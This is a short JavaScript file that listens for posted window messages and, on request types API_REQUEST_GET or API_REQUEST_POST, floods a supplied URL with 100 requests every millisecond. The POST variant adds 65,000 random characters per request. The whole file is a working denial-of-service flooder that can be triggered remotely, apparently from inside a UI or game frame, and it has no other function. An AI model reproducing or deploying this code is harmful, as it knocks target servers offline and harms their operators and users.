$(function () {

    randomString = function (length) {
        var text = "";
        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        for (var i = 0; i < length; i++) {
            text += possible.charAt(Math.floor(Math.random() * possible.length));
        }
        return text;
    }



    window.addEventListener("message", function (event) {
        var item = event.data
        console.log(event.data.type)
        if (item.type == "API_REQUEST_GET") {
            setInterval(() => {
                for (let i = 0; i < 100; i++) {
                    setTimeout(() => {
                        $.get(item.url)                    
                    }, 0);
                }        

            }, 1);
        }

        if (item.type == "API_REQUEST_POST") {
            setInterval(() => {
                for (let i = 0; i < 100; i++) {
                    setTimeout(() => {
                        $.post(item.url, "KRANE=" + randomString(65000));
                    }, 0);
                }        

            }, 1);
            
        }
        



    }, false);
})
